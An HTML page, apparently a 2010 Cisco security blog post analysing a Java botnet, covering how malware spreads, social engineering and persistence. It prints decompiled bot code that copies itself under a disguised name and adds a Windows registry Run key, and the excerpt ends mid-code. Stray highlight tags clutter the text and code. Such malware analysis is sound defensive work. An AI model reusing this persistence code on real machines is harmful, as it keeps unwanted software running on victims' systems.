@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+
+<html lang="eng-US" xmlns:nitro="https://www.bunchball.com/nitro">
+
+<head>
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+	<title>  Exploring a Java Bot: Part 3</title>
+
+	<meta property="og:image" content=""/><meta property="og:description" content="In this post we will examine some of the offensive features incorporated into a botnet designed to launch attacks and maintain control of hosts (aka victims). "/><meta name="description" content="In this post we will examine some of the offensive features incorporated into a botnet designed to launch attacks and maintain control of hosts (aka victims). "/>	<meta property="og:site_name" content="blogs@Cisco - Cisco Blogs"/>
+
+	<meta name="google-site-verification" content="9MlQU9MMQ1jHLMUkONKe6QzZ-ZIGRv0BCD1_rY1Zdmc" />
+
+		<meta name="bitly-verification" content="25789e2a57d8"/>
+
+	<meta name="accessLevel" content="GUEST, CUSTOMER, PARTNER"/>
+
+	<meta name="language" content="en"/>
+
+	<meta name="country" content="US"/>
+
+	<meta name="contentType" content="ciscoBlogs"/>
+
+			<meta name="docType" content="blogPost" />
+
+		<link rel="stylesheet" href="https://blogs.cisco.com/wp-content/themes/cisco_responsive/style.css" type="text/css" media="screen" />
+
+	<link rel="alternate" type="application/rss+xml" title="Cisco Blog RSS Feed" href="https://blogs.cisco.com/feed" />
+
+	<link rel="shortcut icon" href="https://blogs.cisco.com/wp-content/themes/cisco_responsive/favicon.ico" />
+
+	<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+
+
+	<link rel='dns-prefetch' href='//www.cisco.com' />
+<link rel='dns-prefetch' href='//platform.twitter.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/blogs.cisco.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.2"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56794,8205,9794,65039],[55358,56794,8203,9794,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='css-css'  href='https://blogs.cisco.com/wp-content/plugins/bunchball/bunchball.css?ver=4.9.2' type='text/css' media='all' />
+<link rel='stylesheet' id='normalize-css'  href='https://blogs.cisco.com/wp-content/themes/cisco_responsive/normalize.css?ver=4.9.2' type='text/css' media='all' />
+<link rel='stylesheet' id='slidebarsstyle-css'  href='https://blogs.cisco.com/wp-content/themes/cisco_responsive/slidebars.css?ver=4.9.2' type='text/css' media='all' />
+<link rel='stylesheet' id='single-css'  href='https://blogs.cisco.com/wp-content/themes/cisco_responsive/styles/single.css?ver=4.9.2' type='text/css' media='all' />
+<link rel='stylesheet' id='codecolorer-css'  href='https://blogs.cisco.com/wp-content/plugins/codecolorer/codecolorer.css?ver=0.9.14' type='text/css' media='screen' />
+<script type='text/javascript' src='https://blogs.cisco.com/wp-includes/js/jquery/jquery.js?ver=3.3.1'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.0.0'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/plugins/bunchball/bunchball.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/plugins/bunchball/jquery.cookie.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/plugins/bunchball/jquery.slimscroll.min.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/plugins/bunchball/moment.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/plugins/bunchball/livestamp.min.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/modernizr.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/slidebars.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/jquery.lazyload.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/theme_script.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://www.cisco.com/assets/swa/j/blogs.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://www.cisco.com/c/dam/cdc/t/ctm.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/jquery.tools.min.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/jquery.tipTip.minified.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/jquery.sharrre.min.js?ver=4.9.2'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var single_script_vars = {"ajax_url":"https:\/\/blogs.cisco.com\/wp-admin\/admin-ajax.php","post_id":"12912"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-content/themes/cisco_responsive/js/single.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://platform.twitter.com/widgets.js?ver=4.9.2'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blogs.cisco.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blogs.cisco.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Online Safety Tips for Data Privacy Day' href='https://blogs.cisco.com/news/online_safety_tips_for_data_privacy_day' />
+<link rel='next' title='Interoperability key for meeting federal mandates' href='https://blogs.cisco.com/video/interoperability-key-for-meeting-federal-mandates' />
+
+<link rel="canonical" href="https://blogs.cisco.com/security/exploring-a-java-bot-part-3" />
+<link rel='shortlink' href='https://blogs.cisco.com/?p=12912' />
+
+<!-- START - Twitter Cards, G+, Facebook Tags 2.2.3.1 -->
+ <!-- Facebook Open Graph -->
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:title" content="Exploring a Java Bot: Part 3"/>
+  <meta property="og:url" content="https://blogs.cisco.com/security/exploring-a-java-bot-part-3"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2010-01-19T13:18:58+00:00"/>
+  <meta property="article:modified_time" content="2010-11-19T13:19:10+00:00" />
+  <meta property="og:updated_time" content="2010-11-19T13:19:10+00:00" />
+  <meta property="article:section" content="Security"/>
+  <meta property="article:publisher" content="https://www.facebook.com/Cisco"/>
+ <!-- Google+ / Schema.org -->
+ <!-- Twitter Cards -->
+  <meta name="twitter:title" content="Exploring a Java Bot: Part 3"/>
+  <meta name="twitter:url" content="https://blogs.cisco.com/security/exploring-a-java-bot-part-3"/>
+  <meta name="twitter:description" content="In this post we will examine some of the offensive features incorporated into a botnet designed to launch attacks and maintain control of hosts (aka victims)."/>
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:creator" content="@https://twitter.com/security_craig"/>
+  <meta name="twitter:site" content="@Cisco"/>
+ <!-- SEO -->
+ <!-- Misc. tags -->
+ <!-- is_singular -->
+<!-- END - Twitter Cards, G+, Facebook Tags 2.2.3.1 -->
+	
+
+
+
+
+</head>
+
+<body>
+
+	<div id = "rewards_fix"></div>
+
+	<script src="//assets.bunchball.net/scripts/nitro/current/nitro.js" type="text/javascript"></script>	<script>
+		var apiKey = "6912c6c82ccc4863a0311dc8b586b8fb";
+		var userId = "anon";
+		var time = "1521514455";
+		var sig = "9f27669db4269870f498fb199efdd69e";
+		var connectionParams={};
+    		connectionParams.apiKey = apiKey ;
+    		connectionParams.timeStamp = time;
+    		connectionParams.signature = sig;
+    		connectionParams.server =  "//CiscoSupportCommunities2.nitro.bunchball.net/nitro/json/";
+    		connectionParams.userId = userId;
+    	var nitro = new Nitro(connectionParams);
+    	nitro.showPendingNotifications();
+	</script> <header class = "sb-slide">
+        <div id = "hero">
+            <div class = "top_third">
+                <div id="hamburger" class = "sb-open-left">
+                    <i class="fa fa-bars"></i>
+                </div>
+            </div>
+            <div class = "top_third">
+                <div id = "cisco_logo">
+                    <div class="dropdown">
+                        <div class = "logo_hover"></div>
+                        <div class="dropdown-content">
+                            <ul>
+                                <li><a href = "https://cisco.com">All of Cisco</a></li>
+                                <li><a href = "https://blogs.cisco.com">Blogs Home</a></li>
+                            </ul>
+                         </div>
+                    </div>
+                </div>
+            </div>
+            <div class = "hero_header_text">Cisco Blogs</div>
+                <div id = "mobile_search_top">
+                    <i class="fa fa-search"></i>
+                </div>
+
+                <a class = "top_login" href = "https://socialrewards-prod.cloudapps.cisco.com/">Log In to Cisco.com</a>
+                
+                <div id = "normal_search">
+                    <div id = "normal_search_box"><form method="get" id="searchform" action="https://blogs.cisco.com/">
+
+	<input type="text" value=""
+
+    	name="s" id="s">
+
+    </input>
+
+<input type="submit" value=" " class="searchSubmit"/>
+
+</form>
+
+</div>
+                        <i class="fa fa-search"></i>
+                    <div class = "clear"></div>
+                </div>
+            <div class = "clear"></div>
+            <div id = "normal_menu">
+                <nav>
+  <a class = "hamburger_login" href = "https://blogs.cisco.com:9031/sp/startSSO.ping?PartnerIdpId=cloudsso.cisco.com">Log In to Cisco.com</a>      <ul>
+                  <li><a href='https://blogs.cisco.com'><span>All Blogs</span></a></li>
+                  <li><a href='#'><span>Technologies</span></a>
+                  <ul>
+            <div class = "bordertop"></div>
+            <li><a href="https://blogs.cisco.com/analytics-automation">Analytics &amp; Automation</a></li>
+            <li><a href="https://blogs.cisco.com/cloud">Cloud</a></li>
+            <li><a href='https://blogs.cisco.com/collaboration'>Collaboration</a></li>
+            <li><a href='https://blogs.cisco.com/datacenter'>Data Center</a></li>
+            <li><a href='https://blogs.cisco.com/digital'>Digital Transformation</a></li>
+            <li><a href='https://blogs.cisco.com/enterprise'>Enterprise Networks</a></li>
+            <li><a href='https://blogs.cisco.com/innovation'>Innovation</a></li>
+            <li><a href='https://blogs.cisco.com/wireless'>Mobility</a></li>
+            <li><a href='https://blogs.cisco.com/security'>Security</a></li>
+            <li class = "sub"><a href="https://blogs.cisco.com/talos" class="nav_menu" title="">Threat Research</a></li>
+            <li><a href='https://blogs.cisco.com/smallbusiness'>Small Business</a></li>
+            <li><a href='https://blogs.cisco.com/services'>Services</a></li>
+            <li><a href='https://blogs.cisco.com/sp'>SP360:Service Provider</a></li>
+          </ul>
+        </li>
+                  <li><a href='#'><span>Industries</span></a>
+                      <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/education'>Education</a></li>
+            <li><a href='https://blogs.cisco.com/energy'>Energy</a></li>
+            <li><a href='https://blogs.cisco.com/financialservices'>Financial Services</a></li>
+            <li><a href='https://blogs.cisco.com/government'>Government</a></li>
+            <li><a href='https://blogs.cisco.com/healthcare'>Healthcare</a></li>
+            <li><a href='https://blogs.cisco.com/manufacturing'>Manufacturing</a></li>
+            <li><a href='https://blogs.cisco.com/retail'>Retail &amp; Hospitality</a></li>
+          </ul>
+        </li>
+                  <li><a href='#'><span>Partners</span></a> 
+          <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/partner'>Partner</a></li>
+          </ul>
+        </li>
+        <li><a href='#'><span>For the Tech Expert</span></a>           <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/getyourbuildon'>Architects &amp; Distinguished Engineers</a></li>
+            <li><a href='https://blogs.cisco.com/developer'>Developer</a></li>
+            <li><a href='https://blogs.cisco.com/performance'>High Performance Computing</a></li>
+            <li><a href='https://blogs.cisco.com/ciscoit'>Inside Cisco IT</a></li>
+            <li><a href='https://blogs.cisco.com/cin'>TechWiseTV</a></li>
+          </ul>
+        </li>
+         <li><a href='#'><span>Get to Know Cisco</span></a>           <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/csr'>Corporate Social Responsibility</a></li>
+            <li><a href='https://blogs.cisco.com/cle'>Connected Life Exchange</a></li>
+            <li><a href='https://blogs.cisco.com/customerstories'>Customer Stories</a></li>
+            <li><a href='https://blogs.cisco.com/socialmedia'>Digital and Social Media</a></li>
+            <li><a href='https://blogs.cisco.com/gov'>High Tech Policy</a></li>
+            <li><a href='https://blogs.cisco.com/diversity'>Inclusion and Diversity</a></li>
+            <li><a href='https://blogs.cisco.com/lifeatcisco'>Life at Cisco</a></li>
+            <li><a href='https://blogs.cisco.com/perspectives'>Perspectives</a></li>
+            <li><a href='https://blogs.cisco.com/news'>Executive Platform: News &amp; Insights</a></li>
+          </ul>
+        </li>
+        <li class = "countries"><a href='#'><span>Countries and Regions</span></a>
+          <ul>
+            <div class = "col_1">
+  <li><a href="https://apjc.thecisconetwork.com/">Asia Pacific</a>
+  <li><a href="https://gblogs.cisco.com/at/">Austria</a>
+  <li><span class = "sub_main">Belgium</span></li>
+    <li class = "sub"><a href="https://gblogs.cisco.com/be">Dutch</a></li>
+    <li class = "sub"><a href="https://gblogs.cisco.com/be-fr">French</a></li>
+  <li><a href="https://gblogs.cisco.com/br/">Brazil</a>
+  <li><span class = "sub_main">Canada</span></li>
+    <li class = "sub"><a href="https://canadablog.cisco.com/">English</a></li>
+    <li class = "sub"><a href="https://ciscocanadafr.wordpress.com/">French</a></li>
+
+  </div>
+    <div class = "col_2">
+    <li><a href="https://gblogs.cisco.com/fin/">Finland</a>
+    <li><a href="https://gblogs.cisco.com/fr/">France</a>
+
+  <li><a href="https://gblogs.cisco.com/de">Germany</a></li>
+  <li><a href="https://gblogs.cisco.com/gr/">Greece</a>
+  <li><a href="https://gblogs.cisco.com/in">India</a></li>
+  <li><a href="https://gblogs.cisco.com/it/">Italy</a></li>
+  <li><a href="https://gblogs.cisco.com/jp/">Japan</a></li>
+  <li><a href="https://ciscokrblog.com/">Korea</a></li>
+
+  </div>
+  <div class = "col_3">
+  <li><span class = "sub_main">Latin America</span></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/la/">Latin America (Esp)</a></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/cansac/">Cansac</a></li>
+  <li><a href="https://gblogs.cisco.com/nl/">Netherlands</a></li>
+  <li><a href="https://gblogs.cisco.com/no">Norway</a></li>
+  <li><a href="https://gblogs.cisco.com/pl">Poland</a></li>
+  <li><a href="https://gblogs.cisco.com/pt">Portugal</a></li>
+  <li><a href="https://gblogs.cisco.com/ro">Romania</a></li>
+  </div>
+
+  <div class = "col_4">
+  <li><a href="https://gblogs.cisco.com/ru">Russia</a></li>
+  <li><a href="https://gblogs.cisco.com/es">Spain</a></li>
+  <li><span class = "sub_main">Switzerland</span></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/ch-tech/">English</a></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/ch-fr/">French</a></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/ch-de/">German</a></li>
+  <li><a href="https://gblogs.cisco.com/tr/">Turkey</a></li>
+  <li><a href="https://gblogs.cisco.com/uki/">UK &amp; Ireland</a></li>
+</div>
+<div class = "clear"></div>
+</ul>
+</li>
+      </ul>
+</nav>
+            </div>
+            <div id = "mobile_search">
+                <div id = "mobile_search_box">
+                    <form method="get" id="searchform" action="https://blogs.cisco.com/">
+
+	<input type="text" value=""
+
+    	name="s" id="s">
+
+    </input>
+
+<input type="submit" value=" " class="searchSubmit"/>
+
+</form>
+
+                </div>
+        </div>
+        </div>  
+    </header>
+     
+        
+  <div id="share_bar1">
+
+    <span class = "share_title">Share</span>
+    <div class="twitter sharrre">
+      <div class = "box">
+        <div class = "count twitcount"></div>
+        <a class = "twitclick" href="https://twitter.com/intent/tweet?url=http://bit.ly/1csxEsz&text=Exploring a Java Bot: Part 3&via=ciscosecurity" data-config-metrics-group='social_shares' data-config-metrics-title='twitter_shares' data-config-metrics-item='twitter_share'>tweet</a>
+      </div>
+    </div>
+
+    <div class="facebook sharrre">
+      <div class = "box">
+        <div class = "count fbcount"></div>
+        <a class = "fbclick share" href = "http://www.facebook.com/sharer/sharer.php?u=https://blogs.cisco.com/security/exploring-a-java-bot-part-3&title=Exploring a Java Bot: Part 3" data-config-metrics-group='social_shares' data-config-metrics-title='facebook_shares' data-config-metrics-item='facebook_share' onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>
+      </div>
+    </div>
+
+
+    <div class="linkedin sharrre">
+      <div class = "box">
+        <div class = "count licount"></div>
+        <a class = "liclick share" href = "https://www.linkedin.com/cws/share?url=https://blogs.cisco.com/security/exploring-a-java-bot-part-3" data-title=" " data-config-metrics-group='social_shares' data-config-metrics-title='linkedin_shares' data-config-metrics-item='linkedin_share' onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>
+
+
+      </div>
+    </div>
+
+    <div class="googleplus sharrre">
+      <div class = "box">
+        <div class = "count gpcount"></div>
+        <a class = "gpclick share" href="https://plus.google.com/share?url=https://blogs.cisco.com/security/exploring-a-java-bot-part-3" data-title=" " data-config-metrics-group='social_shares' data-config-metrics-title='google_shares' data-config-metrics-item='google_share' onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>
+      </div>
+    </div>
+        <div class = "share_mail"><a class="email emclick" href="mailto:?subject=Cisco Blog: Exploring a Java Bot: Part 3&body=I saw this post on Cisco Security blog and thought you might like to read it.%0A%0AExploring a Java Bot: Part 3%0A%0Ahttps://blogs.cisco.com/security/exploring-a-java-bot-part-3%0A%0A****Disclaimer****%0A%0ACisco is not responsible for the content of this email, and its contents do not necessarily reflect Cisco’s views or opinions. Cisco has not verified the email address or name of the sender." data-config-metrics-group='social_shares' data-config-metrics-title='email_shares' data-config-metrics-item='email_share'></a></div>
+    <div class = "clear"></div>
+  </div>
+  <div id="sb-site">
+<div id = "main_content">
+
+	<div id = "blog_content">
+	<div id = "main_left">
+
+		<article id = "article_post">
+			<p class = "breadcrumb">
+			<a href=' https://blogs.cisco.com'>Cisco Blog</a> > <a href=' https://blogs.cisco.com/category/security/'>Security</a></p>
+					<div id = "post_image"><img src = "https://alln-extcloud-storage.cisco.com/ciscoblogs/category50.png">  					</div>
+  					<div id = "post_info">
+  						<span class = "post_category">
+  							Security  						</span>
+						<h1 id="post-12912" class="kindle_title title">Exploring a Java Bot: Part 3</h1>
+						<div class="author_image"><img class = "img-circle" src = "https://alln-extcloud-storage.cisco.com/ciscoblogs/userphoto/1461608835-bpthumb.jpg"></div><div class="author_rewards_box">			<ul class = "nitro_author12912 bunchballAwards">
+		<li>
+			<div class = "nitro_badge badgenitro_author12912">
+			</div>
+			<div class = "nitro_points pointsnitro_author12912">
+			</div>
+		</li>
+		<script>
+var nitroName = 'craiwill';
+var sessionKey = '';
+
+
+nitro.callAPI("method=batch.run&methodFeed=%5B%27method%3Duser.getChallengeProgress%26userId%3D" + nitroName + "%26sessionKey%3D" + sessionKey + "%27%2C%27method%3Duser.getLevel%26userIds%3D" + nitroName + "%26sessionKey%3D" + sessionKey + "%27%2C%27method%3Duser.getPointsBalance%26userId%3D" + nitroName + "%26sessionKey%3D" + sessionKey + "%27%5D",  "postBadges", "nitro_author12912");</script>
+
+		</ul>
+		</ul>
+	<div class = "clear"></div>
+</div><div class = "clear"></div><span class = "list_author"><a href="https://blogs.cisco.com/author/craigwilliams" title="Posts by Craig Williams" rel="author">Craig Williams</a> - January 19, 2010 - 0 Comments      					</span>
+      					<br />
+      					<br />
+      										</div>
+					<div class ="clear"></div>
+					<div id ="content">
+					<p>Before we begin part 3 in this series, let&#8217;s review what we&#8217;ve covered so far. In the <a href="http://blogs.cisco.com/security/comments/exploring_a_java_<font color="red">bot</font>_part_1/" target="_blank">first post</a> we learned how this bot was discovered and some basics about <font color="red">botnets</font>. In the <a href="http://blogs.cisco.com/security/comments/exploring_a_java_bot_part_2/" target="_blank">second post</a> we covered <font color="red">botnet</font> fundamentals like command and control (C&amp;C) and various other <font color="red">capabilities</font>. In this post we will examine some of the offensive features incorporated into a <font color="red">botnet</font> designed to launch <font color="red">attacks</font> and maintain control of hosts (aka victims). First we will discuss how <font color="red">botnets</font> spread and then we will look at flooding and how it&#8217;s implemented in this <font color="red">bot</font>.</p>
+<p>There are two main ways <font color="red">malware</font> spreads. It&#8217;s important to note that these two methods are not mutually exclusive. The first method, made famous by the <a href="http://en.wikipedia.org/wiki/Morris_worm" target="_blank">Morris worm</a>, involves targeting a network-based <font color="red">vulnerability</font>; the author designs an exploit to spread his <font color="red">malware</font>. Once the <font color="red">malware</font> takes over a machine it then infects other machines. Every time the binary moves from one machine to another the <font color="red">botnet</font> has the potential to see exponential growth. Most <font color="red">vulnerabilities</font> only affect a specific operating system at a specific range of patch levels. <font color="red">Malware</font> of this nature often hits big and then its growth rate takes a steep dive as patches become available and as <font color="red">malware</font> is removed. Once the <font color="red">vulnerability</font> is patched, the <font color="red">malware</font> must adapt or accept a shrinking <font color="red">attack surface</font>. Two recent examples of this method are <a href="http://tools.cisco.com/security/center/viewAlert.x?alertId=17121" target="_blank"><font color="red">Conficker</font></a> and <a href="http://tools.cisco.com/security/center/viewAlert.x?alertId=5358" target="_blank">Slammer</a>. It is important to note the distinction between the growth rate slowing down and the number of compromised machines. There are still countless machines connected to the Internet running both worms.  Even as the growth rate approaches zero, many, many computers have already been infected and continue to run the <font color="red">malware</font>. In two days time on a single <font color="red">Intrusion Prevention System</font> (<font color="red">IPS</font>) we saw over 178,000 slammer <font color="red">attacks</font>.</p>
+<p>An <font color="red">attacker</font> simply needs to trick an unsuspecting user into running a binary that is under the control of the <font color="red">attacker</font>. This <font color="red">attack</font> vector is known as a trojan horse. A <font color="red">malware</font> author would package his wares as a link from a friend, a new game of interest, or even a program to create keys for pirated software, etc. </p>
+<p><span id="more-12912"></span>We call the technique of targeting a person&#8217;s curiosity, greed, compassion, or other emotions to accomplish an <font color="red">attacker</font>&#8217;s computing objectives <font color="blue">social engineering</font>. Why spend hours ensuring <font color="red">malware</font> takes advantage of the latest and greatest <font color="red">vulnerability</font> instead of just making a clever, enticing package? This ensures that the <font color="red">attacker</font>&#8217;s payload maintains the <font color="red">capability</font> of affecting a much larger <a href="http://en.wikipedia.org/wiki/Attack_surface" target="_blank"><font color="red">attack surface</font></a>: anyone. People can&#8217;t be magically patched. Each one must be individually educated.</p>
+<p>It may not seem obvious that this type of infection vector is extremely effective, but bear in mind the sheer volume an <font color="red">attacker</font> can send. An <font color="red">attacker</font> can send a billion e-mails for the same price as sending 10. If only a small percentage of users actually click and run the <font color="red">malware</font>, the author wins.  .01% of a billion is still 100k <font color="red">nodes</font>, and let&#8217;s face it, I suspect a <font color="red">malware</font> author would have much more luck than that. I&#8217;ve seen a single <a href="http://tools.cisco.com/security/center/viewAlert.x?alertId=18233" target="_blank">Osdok</a> <font color="red">bot</font> on spartan hardware maintain 250k e-mails per hour for hours. Later variants of <a href="http://tools.cisco.com/security/center/viewAlert.x?alertId=18294" target="_blank">Rustock</a> are also capable of this. A <font color="red">botnet</font> can have any number of <font color="red">nodes</font>. Networks with hundreds of thousands of <font color="red">nodes</font> are known to exist. Imagine the volume of messages they are capable of sending.</p>
+<p>Those numbers seem pretty scary, but anti-spam technology has come a long way. I have been doing pure <font color="red">botnet</font> research for about a year now and I keep several <font color="red">bots</font> running at all times. I harvest their spam and exploits to better our technology and devices, and I have got to say I&#8217;ve been impressed. Out of the billions of e-mails processed, the number of spam messages my IronPort appliance blocked was well over 99.9%. </p>
+<p>Due to the fact that <font color="red">malware</font> that follows the trojan design requires human interaction, it is typical for these <font color="red">bots</font> to spread very sporadically. The <font color="red">malware</font> will spread as a region&#8217;s time of day approaches normal waking hours. While I&#8217;ve seen this mentioned a few times, I&#8217;ve never seen an actual term for this aspect of growth behavior, so I&#8217;ll give it one here: regional <font color="red">botnet</font> morphogenesis (RBM).  As a direct result of RBM, an entire region could remain relatively unaffected by <font color="red">malware</font> until the time approaches business hours and people begin to check their e-mail or instant messenger. A sudden sharp spike in infection and related traffic occurs. Due to the delays in the <font color="red">malware</font>&#8217;s propagation associated with RBM, this characteristic of a <font color="red">botnet</font> occasionally allows security product vendors and researchers an extra hour or two to address or prepare for a piece of <font color="red">malware</font></p>
+<p>The <font color="red">java</font> <font color="red">bot</font> we&#8217;ve been discussing does not have the <font color="red">capability</font> to spread itself. It must be installed by another piece of <font color="red">malware</font> or as a trojan horse. Once a user runs this <font color="red">bot</font>, it installs a key into the registry that refers to the binary on the local file system to ensure the <font color="red">malware</font> is loaded when the computer is rebooted. In a nutshell, the Windows registry stores start up programs, settings, and options for a computer. Pretty much all <font color="red">malware</font> ensures it&#8217;s reloaded upon reboot, otherwise once a machine is rebooted or power cycled it would be free of the malicious program. Using the registry seems to be the preferred method.</p>
+<div class="scrollable">
+<div class="highlight">
+<pre><span class="k"></span> <span class="nn"></span><span class="o"></span>
+
+<span class="k">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span>     
+
+<span class="o">{</span>
+
+     <span class="n">Runtime</span> <span class="n">rt</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
+
+     <span class="k">try</span>
+
+
+
+     <span class="o">{</span>
+
+     	<span class="n">copyfile</span><span class="o">(</span><span class="n">Misc</span><span class="o">.</span><span class="na">getJARLoc</span><span class="o">(),</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">Misc</span><span class="o">.</span><span class="na">findStartup</span><span class="o">()))).</span><span class="na">append</span><span class="o">(</span><span class="s">"\\jupdate.jar"</span><span class="o">).</span><span class="na"><font color="red">toString</font></span><span class="o">());</span>
+
+
+
+        	<span class="n">copyfile</span><span class="o">(</span><span class="n">Misc</span><span class="o">.</span><span class="na">getJARLoc</span><span class="o">(),</span> <span class="s">"C://j.jar"</span><span class="o">);</span>
+
+            <span class="k">try</span> <span class="o">{</span>
+
+            <span class="c">/*</span>
+
+
+
+<span class="c">             * Not really needed, this was just for when I used a dropper to drop the trojan into</span>
+
+<span class="c">             * the user's <font color="red">startup</font> folder, also with <font color="red">java</font>.</span>
+
+<span class="c">             */</span>
+
+            <span class="n">File</span> <span class="n">f</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">Misc</span><span class="o">.</span><span class="na">findStartup</span><span class="o">()+</span><span class="s">"//jusched.jar"</span><span class="o">);</span>
+
+
+
+            <span class="n">f</span><span class="o">.</span><span class="na">delete</span><span class="o">();</span>
+
+            <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span> <span class="o">}</span>
+
+
+
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span> <span class="o">}</span>
+
+            <span class="k">try</span>
+
+
+
+            <span class="o">{</span>
+
+                <span class="n">rt</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="s">"cmd.exe /C start reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v C://j.jar /t REG_SZ /d C://j.jar"</span><span class="o">);</span>
+
+            <span class="o">}</span>
+
+            <span class="k">catch</span><span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span>
+
+
+
